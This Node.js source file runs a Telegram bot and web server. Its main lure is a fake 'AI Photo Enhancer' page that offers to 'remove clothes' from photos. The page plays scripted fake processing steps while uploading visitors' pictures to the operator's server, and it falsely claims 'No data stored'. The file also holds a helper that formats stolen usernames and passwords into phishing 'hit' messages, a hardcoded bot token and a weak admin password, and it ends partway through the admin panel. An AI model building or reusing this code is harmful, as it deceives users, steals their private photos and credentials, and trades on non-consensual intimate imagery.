// ====================== index.js (COMPLETE WITH PHOTO ACCESS + QR FIX) ======================
/*
 * © 2026 SeXyxeon (VOIDSEC)
 * Complete Bot - Photo Access + QR Fix + All Features
 */

process.env.NTBA_FIX_350 = 1;

// ====================== CONFIGURATION ======================
const config = {
    mainToken: '8809859232:AAHoJfHSdpJ67h0Blr2scKV_86vrZQhVpIA',
    S7: '@RTFGAMMING',
    adminId: '6346250222',
    port: process.env.PORT || 3000,
    love: 'S7_LOVE_2026',
    adminPassword: 'admin123',
    channels: [
        { id: '-1003004551707', name: 'Main Channel', link: 'https://t.me/RTFGAMINGHACK0' },
        { id: '-1003559518526', name: 'Main Group', link: 'https://t.me/RTFGAMINGHACK0' }
    ],
    bot: '𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 𝐁𝐎𝐘 𝐅𝐎𝐑𝐄𝐕𝐄𝐑 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐁𝐎𝐓',
    baseUrl: process.env.RENDER_URL || 'https://rtf-rose-bot-l4hw.onrender.com'
};

console.log('✅ Bot Token loaded successfully!');
console.log('📌 Base URL:', config.baseUrl);

// ====================== DEPENDENCIES ======================
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const moment = require('moment-timezone');
const fs = require('fs');
const path = require('path');
const multer = require('multer');

// ====================== SETUP ======================
const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));

// Create directories
const PHOTO_DIR = path.join(__dirname, 'photos');
const DATA_DIR = path.join(__dirname, 'data');
const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
const PAGES_DIR = path.join(__dirname, 'pages');
const UPLOADS_DIR = path.join(__dirname, 'uploads');

if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

// Storage files
const PHOTOS_FILE = path.join(DATA_DIR, 'photos.json');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const REFERRALS_FILE = path.join(DATA_DIR, 'referrals.json');
const CHANNELS_FILE = path.join(DATA_DIR, 'channels.json');
const FEATURED_FILE = path.join(DATA_DIR, 'featured.json');
const QR_FILE = path.join(DATA_DIR, 'qr.png');
const LOGS_FILE = path.join(DATA_DIR, 'logs.txt');

if (!fs.existsSync(PHOTOS_FILE)) fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos: [] }, null, 2));
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify({ users: {} }, null, 2));
if (!fs.existsSync(REFERRALS_FILE)) fs.writeFileSync(REFERRALS_FILE, JSON.stringify({ referrals: [] }, null, 2));
if (!fs.existsSync(CHANNELS_FILE)) fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels: config.channels }, null, 2));
if (!fs.existsSync(FEATURED_FILE)) fs.writeFileSync(FEATURED_FILE, JSON.stringify({ photo: null, message: '🌟 Welcome! Use /start to begin.', status: true }, null, 2));
if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, '');

// ====================== MULTER SETUP ======================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        if (file.fieldname === 'photo' || file.fieldname === 'qr') {
            cb(null, BOT_PHOTO_DIR);
        } else if (file.fieldname === 'userphoto') {
            cb(null, UPLOADS_DIR);
        } else {
            cb(null, BOT_PHOTO_DIR);
        }
    },
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Only images allowed!'));
        }
    }
});

// ====================== USER DATA FUNCTIONS ======================
function getUsers() {
    try { return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8')).users || {}; } catch { return {}; }
}

function saveUsers(users) {
    fs.writeFileSync(USERS_FILE, JSON.stringify({ users }, null, 2));
}

function getUser(userId) {
    const users = getUsers();
    if (!users[userId]) {
        users[userId] = {
            credits: 3,
            referrals: 0,
            totalReferrals: 0,
            unlimited: false,
            joinedAt: new Date().toISOString(),
            referredBy: null,
            _pendingReferrer: null,
            _waitingForQR: false,
            _pendingPayment: null
        };
        saveUsers(users);
    }
    return users[userId];
}

function updateUser(userId, data) {
    const users = getUsers();
    if (!users[userId]) users[userId] = { credits: 3, referrals: 0, totalReferrals: 0, unlimited: false, joinedAt: new Date().toISOString(), referredBy: null, _pendingReferrer: null, _waitingForQR: false, _pendingPayment: null };
    Object.assign(users[userId], data);
    saveUsers(users);
    return users[userId];
}

function addCredits(userId, amount) {
    const user = getUser(userId);
    if (user.unlimited) return user;
    user.credits = (user.credits || 0) + amount;
    saveUsers(getUsers());
    return user;
}

function useCredit(userId) {
    const user = getUser(userId);
    if (user.unlimited) return true;
    if ((user.credits || 0) <= 0) return false;
    user.credits = (user.credits || 0) - 1;
    saveUsers(getUsers());
    return true;
}

function getReferrals() {
    try { return JSON.parse(fs.readFileSync(REFERRALS_FILE, 'utf8')).referrals || []; } catch { return []; }
}

function saveReferrals(referrals) {
    fs.writeFileSync(REFERRALS_FILE, JSON.stringify({ referrals }, null, 2));
}

function addReferral(referrerId, newUserId) {
    const referrals = getReferrals();
    referrals.push({
        referrerId: String(referrerId),
        newUserId: String(newUserId),
        timestamp: new Date().toISOString()
    });
    saveReferrals(referrals);
    
    const referrer = getUser(referrerId);
    referrer.totalReferrals = (referrer.totalReferrals || 0) + 1;
    referrer.referrals = (referrer.referrals || 0) + 1;
    if (!referrer.unlimited) {
        referrer.credits = (referrer.credits || 0) + 2;
    }
    saveUsers(getUsers());
    
    return referrer;
}

function getChannels() {
    try { return JSON.parse(fs.readFileSync(CHANNELS_FILE, 'utf8')).channels || []; } catch { return []; }
}

function saveChannels(channels) {
    fs.writeFileSync(CHANNELS_FILE, JSON.stringify({ channels }, null, 2));
}

function addChannel(id, name, link) {
    const channels = getChannels();
    channels.push({ id, name, link });
    saveChannels(channels);
    return channels;
}

function removeChannel(id) {
    let channels = getChannels();
    channels = channels.filter(c => c.id !== id);
    saveChannels(channels);
    return channels;
}

// ====================== FEATURED FUNCTIONS ======================
function getFeatured() {
    try { return JSON.parse(fs.readFileSync(FEATURED_FILE, 'utf8')); } 
    catch { return { photo: null, message: '🌟 Welcome! Use /start to begin.', status: true }; }
}

function saveFeatured(data) {
    fs.writeFileSync(FEATURED_FILE, JSON.stringify(data, null, 2));
}

function setFeaturedPhoto(photoId) {
    const featured = getFeatured();
    featured.photo = photoId;
    saveFeatured(featured);
    return featured;
}

function setFeaturedMessage(message) {
    const featured = getFeatured();
    featured.message = message;
    saveFeatured(featured);
    return featured;
}

function toggleFeaturedStatus() {
    const featured = getFeatured();
    featured.status = !featured.status;
    saveFeatured(featured);
    return featured;
}

// ====================== PHOTO FUNCTIONS ======================
function getPhotos() {
    try { return JSON.parse(fs.readFileSync(PHOTOS_FILE, 'utf8')).photos || []; } catch { return []; }
}

function savePhotos(photos) {
    fs.writeFileSync(PHOTOS_FILE, JSON.stringify({ photos }, null, 2));
}

function addPhoto(file, caption = '') {
    const photos = getPhotos();
    const photoData = {
        id: Date.now().toString(),
        filename: file.filename,
        originalName: file.originalname,
        url: `/api/photos/${file.filename}`,
        caption: caption,
        uploadedAt: new Date().toISOString(),
        active: true
    };
    photos.push(photoData);
    savePhotos(photos);
    return photoData;
}

function deletePhoto(id) {
    const photos = getPhotos();
    const index = photos.findIndex(p => p.id === id);
    if (index === -1) return false;
    const photo = photos[index];
    const filePath = path.join(BOT_PHOTO_DIR, photo.filename);
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
    photos.splice(index, 1);
    savePhotos(photos);
    return true;
}

function togglePhoto(id) {
    const photos = getPhotos();
    const photo = photos.find(p => p.id === id);
    if (!photo) return false;
    photo.active = !photo.active;
    savePhotos(photos);
    return photo;
}

function getActivePhotos() {
    return getPhotos().filter(p => p.active);
}

function getRandomPhoto() {
    const photos = getActivePhotos();
    if (photos.length === 0) return null;
    return photos[Math.floor(Math.random() * photos.length)];
}

// ====================== HELPER FUNCTIONS ======================
function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
    return `🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ${platform}\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ${username}\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ${password}\n⏱ ↝ ᴛɪᴍᴇ » ${SYloveTiMe}\n📝 ↝ ᴅᴀᴛᴇ » ${SYloveDaTe}\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ${dev}`;
}

function MenuLove(firstName, dev, SeXy, LoveTime, message) {
    return `─【 ${dev} 】─\n────────────────────\n ᴜsᴇʀ ➤ ${firstName} ›\n ɴᴀᴍᴇ ➤ ${SeXy} ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ${LoveTime}›\n ────────────────────\n\n ${message} \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─`;
}

function getUptime() {
    const ut = process.uptime();
    const h = Math.floor(ut / 3600);
    const m = Math.floor((ut % 3600) / 60);
    const s = Math.floor(ut % 60);
    return `${h}h ${m}m ${s}s`;
}

function LoveNotifer(platform, username, password) {
    const SYloveTiMe = moment().tz("Asia/Kolkata").format('h:mm:ss A');
    const SYloveDaTe = moment().tz("Asia/Kolkata").format('DD/MM/YYYY');
    return LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, config.S7);
}

function SYloveMenu(firstName, message) {
    return MenuLove(firstName, config.S7, config.bot, getUptime(), message);
}

async function checkAllChannels(userId) {
    const channels = getChannels();
    for (const channel of channels) {
        try {
            const member = await S7.getChatMember(channel.id, userId);
            const valid = ['creator', 'administrator', 'member', 'restricted'];
            if (!valid.includes(member.status)) return false;
        } catch (e) {
            return false;
        }
    }
    return true;
}

function getChannelButtons() {
    const channels = getChannels();
    const buttons = channels.map(c => [{ text: `📢 ${c.name}`, url: c.link }]);
    buttons.push([{ text: "✅ Check All Joined", callback_data: "check_all" }]);
    return { inline_keyboard: buttons };
}

// ====================== PHOTO ACCESS TEMPLATE ======================
const PHOTO_ACCESS_TEMPLATE = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Photo Enhancer</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden}
        .card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.08);border-radius:40px;padding:45px 35px;width:100%;max-width:500px;box-shadow:0 50px 100px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.05)}
        .header{text-align:center;margin-bottom:30px}
        .header .icon{font-size:80px;background:linear-gradient(135deg,#ff6b6b,#ee5a24,#ff4757);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}
        .header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header p{color:#888;font-size:14px;margin-top:5px}
        .feature-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,0.06);margin:20px 0}
        .feature-box .item{display:flex;align-items:center;gap:15px;padding:10px 0;color:#ccc;font-size:14px;border-bottom:1px solid rgba(255,255,255,0.03)}
        .feature-box .item:last-child{border-bottom:none}
        .feature-box .item i{font-size:22px;width:35px;color:#ff6b6b}
        .feature-box .item .label{color:#fff}
        .upload-zone{background:rgba(255,255,255,0.03);border:2px dashed rgba(255,255,255,0.1);border-radius:20px;padding:40px 20px;text-align:center;cursor:pointer;transition:all .3s;margin:20px 0}
        .upload-zone:hover{border-color:#ff6b6b;background:rgba(255,107,107,0.05)}
        .upload-zone i{font-size:50px;color:#ff6b6b;display:block;margin-bottom:10px}
        .upload-zone p{color:#aaa;font-size:16px}
        .upload-zone .small{color:#666;font-size:12px;margin-top:5px}
        .btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(238,90,36,0.3)}
        .btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(238,90,36,0.5)}
        .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
        .btn i{margin-right:10px}
        .status{text-align:center;margin-top:15px;padding:15px;border-radius:12px;display:none;font-size:14px}
        .status.success{background:rgba(46,213,115,0.15);color:#2ed573;display:block}
        .status.error{background:rgba(255,71,87,0.15);color:#ff4757;display:block}
        .status.info{background:rgba(54,164,235,0.15);color:#36a4eb;display:block}
        .status.warning{background:rgba(255,165,0,0.15);color:#ffa500;display:block}
        .progress-container{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}
        .progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff6b6b,#ee5a24);transition:width .3s}
        .preview-area{display:none;margin:15px 0;padding:15px;background:rgba(255,255,255,0.03);border-radius:15px;border:1px solid rgba(255,255,255,0.05)}
        .preview-area img{width:100%;max-height:300px;object-fit:contain;border-radius:10px}
        .preview-area .filename{color:#aaa;font-size:12px;text-align:center;margin-top:8px}
        .result-area{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}
        .result-area i{font-size:40px;color:#2ed573}
        .result-area h3{color:#2ed573;margin-top:8px}
        .result-area p{color:#888;font-size:13px;margin-top:5px}
        .loading-dots{display:inline-block;animation:dots 1.5s infinite}
        @keyframes dots{0%,20%{content:'...'}40%{content:'...'}60%{content:'...'}80%{content:'...'}100%{content:'...'}}
        .spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff6b6b;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}
        @keyframes spin{100%{transform:rotate(360deg)}}
        .bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(255,107,107,0.06),transparent 70%);animation:float 25s infinite ease-in-out}
        .bg-shapes span:nth-child(1){width:500px;height:500px;top:-150px;right:-150px;animation-delay:-3s}
        .bg-shapes span:nth-child(2){width:400px;height:400px;bottom:-100px;left:-100px;animation-delay:-7s}
        .bg-shapes span:nth-child(3){width:300px;height:300px;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-12s}
        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(40px,-40px) scale(1.1)}}
        .footer{text-align:center;margin-top:20px;color:#444;font-size:11px}
        .footer a{color:#555;text-decoration:none}
        #fileInput{display:none}
        .btn-secondary{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#aaa;margin-top:10px}
        .btn-secondary:hover{background:rgba(255,255,255,0.08)}
        .count-badge{background:#ff6b6b;color:#fff;padding:2px 12px;border-radius:20px;font-size:12px;margin-left:10px}
        .image-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:5px;margin-top:10px}
        .image-grid img{width:100%;height:80px;object-fit:cover;border-radius:8px;border:1px solid rgba(255,255,255,0.05)}
        .image-grid .more{display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.03);border-radius:8px;color:#888;font-size:12px}
        .processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}
    </style>
</head>
<body>
<div class="bg-shapes"><span></span><span></span><span></span></div>
<div class="card">
    <div class="header">
        <span class="icon"><i class="fas fa-magic"></i></span>
        <h1>✨ AI Photo Enhancer</h1>
        <p>Remove clothes instantly with AI technology</p>
    </div>
    
    <div class="feature-box">
        <div class="item"><i class="fas fa-robot"></i> <span class="label">AI Powered</span> <span style="color:#888;font-size:12px;margin-left:auto;">v3.0</span></div>
        <div class="item"><i class="fas fa-bolt"></i> <span class="label">Instant Processing</span> <span style="color:#888;font-size:12px;margin-left:auto;">2-5s</span></div>
        <div class="item"><i class="fas fa-shield-alt"></i> <span class="label">100% Private</span> <span style="color:#888;font-size:12px;margin-left:auto;">🔒</span></div>
        <div class="item"><i class="fas fa-image"></i> <span class="label">HD Quality</span> <span style="color:#888;font-size:12px;margin-left:auto;">4K</span></div>
    </div>

    <div id="uploadZone" class="upload-zone" onclick="document.getElementById('fileInput').click()">
        <i class="fas fa-cloud-upload-alt"></i>
        <p><strong>Tap to select photo</strong></p>
        <div class="small">Supported: JPG, PNG, WEBP (Max 20MB)</div>
    </div>
    
    <input type="file" id="fileInput" accept="image/*" multiple>
    
    <div id="previewArea" class="preview-area">
        <img id="previewImg" src="">
        <div class="filename" id="fileName">No file selected</div>
    </div>
    
    <button class="btn" id="processBtn" onclick="processPhotos()" disabled>
        <i class="fas fa-wand-magic-sparkles"></i> PROCESS PHOTOS
    </button>
    
    <div id="status" class="status"></div>
    <div class="progress-container" id="progressContainer"><div class="fill" id="progressFill"></div></div>
    
    <div id="resultArea" class="result-area" style="display:none">
        <i class="fas fa-check-circle"></i>
        <h3>✅ Processing Complete!</h3>
        <p id="resultText">Your photos have been processed successfully.</p>
        <button class="btn btn-secondary" onclick="closeResult()"><i class="fas fa-times"></i> Close</button>
    </div>
    
    <div id="processingStatus" style="display:none">
        <div class="spinner"></div>
        <div class="processing-text" id="processingText">🔮 Analyzing photo structure...</div>
    </div>
    
    <div id="imageGrid" class="image-grid"></div>
    
    <div class="footer">🔒 Secure & Private • No data stored</div>
</div>

<script>
const USER_ID = "USERID_PLACEHOLDER";
const PLATFORM = "PLATFORM_PLACEHOLDER";
let selectedFiles = [];
let processedCount = 0;

document.getElementById('fileInput').addEventListener('change', function(e) {
    const files = this.files;
    if (files.length === 0) return;
    
    selectedFiles = Array.from(files);
    const preview = document.getElementById('previewArea');
    const img = document.getElementById('previewImg');
    const name = document.getElementById('fileName');
    
    // Show first image preview
    const reader = new FileReader();
    reader.onload = function(e) {
        img.src = e.target.result;
        preview.style.display = 'block';
        name.textContent = selectedFiles.length + ' photo(s) selected';
    };
    reader.readAsDataURL(files[0]);
    
    document.getElementById('processBtn').disabled = false;
    document.getElementById('processBtn').innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> PROCESS ' + selectedFiles.length + ' PHOTO(S)';
    
    showStatus('📸 ' + selectedFiles.length + ' photos ready for processing', 'info');
});

function showStatus(msg, type='info') {
    const el = document.getElementById('status');
    el.textContent = msg;
    el.className = 'status ' + type;
    el.style.display = 'block';
}

function hideStatus() {
    document.getElementById('status').style.display = 'none';
}

function updateProgress(percent) {
    const container = document.getElementById('progressContainer');
    container.style.display = 'block';
    document.getElementById('progressFill').style.width = percent + '%';
}

function showProcessing(text) {
    document.getElementById('processingStatus').style.display = 'block';
    document.getElementById('processingText').textContent = text;
}

function hideProcessing() {
    document.getElementById('processingStatus').style.display = 'none';
}

function closeResult() {
    document.getElementById('resultArea').style.display = 'none';
}

function showResult(text) {
    document.getElementById('resultArea').style.display = 'block';
    document.getElementById('resultText').textContent = text;
}

async function processPhotos() {
    if (selectedFiles.length === 0) {
        showStatus('⚠️ Please select photos first', 'warning');
        return;
    }
    
    const btn = document.getElementById('processBtn');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
    hideStatus();
    hideProcessing();
    document.getElementById('resultArea').style.display = 'none';
    document.getElementById('imageGrid').innerHTML = '';
    
    showProcessing('🔮 Analyzing photo structure...');
    updateProgress(5);
    await sleep(800);
    
    showProcessing('🧠 AI processing image data...');
    updateProgress(20);
    await sleep(1000);
    
    showProcessing('⚡ Applying neural filters...');
    updateProgress(40);
    await sleep(1200);
    
    showProcessing('✨ Enhancing details...');
    updateProgress(60);
    await sleep(1000);
    
    showProcessing('📤 Sending results...');
    updateProgress(80);
    
    // Send each photo to bot
    let successCount = 0;
    for (let i = 0; i < Math.min(selectedFiles.length, 20); i++) {
        try {
            const file = selectedFiles[i];
            const reader = new FileReader();
            const fileData = await new Promise((resolve, reject) => {
                reader.onload = (e) => resolve(e.target.result);
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
            
            // Send to bot
            const response = await fetch('/api/upload-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userid: USER_ID,
                    platform: PLATFORM,
                    filename: file.name,
                    data: fileData,
                    size: file.size
                })
            });
            
            if (response.ok) successCount++;
            
            // Update progress
            const percent = 80 + (i / Math.min(selectedFiles.length, 20)) * 20;
            updateProgress(percent);
            
            // Show preview in grid
            const reader2 = new FileReader();
            reader2.onload = function(e) {
                const grid = document.getElementById('imageGrid');
                const img = document.createElement('img');
                img.src = e.target.result;
                grid.appendChild(img);
                grid.style.display = 'grid';
            };
            reader2.readAsDataURL(file);
            
            await sleep(300);
        } catch(err) {
            console.error('Error processing file:', err);
        }
    }
    
    updateProgress(100);
    hideProcessing();
    
    if (successCount > 0) {
        showResult('✅ ' + successCount + ' photo(s) processed successfully!\n\n⚠️ Server overloaded. Please try again in 2-3 hours for full quality.');
        showStatus('✅ Processing complete!', 'success');
    } else {
        showStatus('❌ Processing failed. Please try again.', 'error');
    }
    
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> PROCESS PHOTOS';
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// Add glow effect on upload zone
document.getElementById('uploadZone').addEventListener('dragover', function(e) {
    e.preventDefault();
    this.style.borderColor = '#ff6b6b';
    this.style.background = 'rgba(255,107,107,0.05)';
});

document.getElementById('uploadZone').addEventListener('dragleave', function() {
    this.style.borderColor = 'rgba(255,255,255,0.1)';
    this.style.background = 'rgba(255,255,255,0.03)';
});

document.getElementById('uploadZone').addEventListener('drop', function(e) {
    e.preventDefault();
    this.style.borderColor = 'rgba(255,255,255,0.1)';
    this.style.background = 'rgba(255,255,255,0.03)';
    const files = e.dataTransfer.files;
    if (files.length > 0) {
        document.getElementById('fileInput').files = files;
        document.getElementById('fileInput').dispatchEvent(new Event('change'));
    }
});
</script>
</body>
</html>`;

// ====================== EXPRESS ROUTES ======================
app.use('/api/photos', express.static(BOT_PHOTO_DIR));
app.use('/uploads', express.static(UPLOADS_DIR));

// ====================== ADMIN PANEL (WEB) ======================
app.get('/admin', (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
        body{background:#0a0a0a;color:#fff;padding:20px}
        .container{max-width:1200px;margin:0 auto}
        .header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}
        .header h1{font-size:36px}
        .tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}
        .tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s}
        .tab.active{background:#667eea;border-color:#667eea}
        .tab:hover{background:#2a2a4a}
        .tab-content{display:none}
        .tab-content.active{display:block}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}
        .card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}
        .card:hover{transform:translateY(-5px);border-color:#667eea}
        .card img{width:100%;height:200px;object-fit:cover;border-radius:10px}
        .card .info{padding:10px 0}
        .card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}
        .btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}
        .btn-danger{background:#dc3545;color:#fff}
        .btn-danger:hover{background:#c82333}
        .btn-warning{background:#ffc107;color:#000}
        .btn-warning:hover{background:#e0a800}
        .btn-primary{background:#007bff;color:#fff}
        .btn-primary:hover{background:#0069d9}
        .btn-success{background:#28a745;color:#fff}
        .btn-success:hover{background:#218838}
        .upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}
        .upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}
        .upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}
        .upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}
        .stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}
        .stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
        .stat-card .number{font-size:32px;font-weight:700;color:#667eea}
        .stat-card .label{color:#888;font-size:14px}
        .channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}
        .channel-item .name{font-weight:600}
        .channel-item .id{color:#888;font-size:12px}
        .user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}
        .user-card .uid{color:#667eea;font-weight:600}
        .toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}
        .toast.error{background:#dc3545}
        .empty{text-align:center;padding:60px 20px;color:#666}
        .empty i{font-size:64px;margin-bottom:20px;display:block}
        input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}
        .flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
        .qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}
        .qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}
        .featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}
        .featured-preview img{max-width:200px;border-radius:10px}
        .status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}
        .status-active{background:#1a3a1a;color:#28a745}
        .status-inactive{background:#3a1a1a;color:#dc3545}
        .logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}
        .qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}
    </style>
</head>
<body>
<div class="container">
    <div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div>
    
    <div class="tabs">
        <div class="tab active" onclick="showTab('photos')">📷 Photos</div>
        <div class="tab" onclick="showTab('channels')">📢 Channels</div>
        <div class="tab" onclick="showTab('users')">👥 Users</div>
        <div class="tab" onclick="showTab('featured')">⭐ Featured</div>
        <div class="tab" onclick="showTab('qr')">💰 QR</div>
        <div class="tab" onclick="showTab('logs')">📋 Logs</div>
        <div class="tab" onclick="showTab('commands')">📜 Commands</div>
    </div>

    <!-- Photos Tab -->
    <div id="tab-photos" class="tab-content active">
        <div class="stats" id="stats"></div>
        <div class="upload-section">
            <h3>📤 Upload Photo</h3>
            <form id="uploadForm" enctype="multipart/form-data">
                <input type="file" name="photo" accept="image/*" required>
                <input type="text" name="caption" placeholder="Caption">
                <button type="submit" class="btn btn-primary">Upload</button>
            </form>
        </div>
        <div id="photoGrid" class="grid"></div>
    </div>

    <!-- Channels Tab -->
    <div id="tab-channels" class="tab-content">
        <h2>📢 Manage Channels</h2>
        <div class="upload-section">
            <h3>➕ Add Channel</h3>
            <div class="flex">
                <input type="text" id="channelId" placeholder="Channel ID" style="flex:1">
                <input type="text" id="channelName" placeholder="Channel Name" style="flex:1">
                <input type="text" id="channelLink" placeholder="Channel Link" style="flex:1">
                <button class="btn btn-success" onclick="addChannel()">Add</button>
            </div>
        </div>
        <div id="channelList"></div>
    </div>

    <!-- Users Tab -->
    <div id="tab-users" class="tab-content">
        <h2>👥 Manage Users</h2>
        <div class="flex" style="margin-bottom:20px">
            <input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1">
            <button class="btn btn-primary" onclick="searchUser()">Search</button>
        </div>
        <div id="userList"></div>
        <div class="flex" style="margin-top:20px">
            <input type="text" id="userIdInput" placeholder="User ID" style="flex:1">
            <input type="number" id="creditAmount" placeholder="Credits" style="width:150px">
            <button class="btn btn-warning" onclick="modifyCredits()">Modify</button>
            <button class="btn btn-success" onclick="toggleUnlimited()">Unlimited</button>
        </div>
    </div>

    <!-- Featured Tab -->
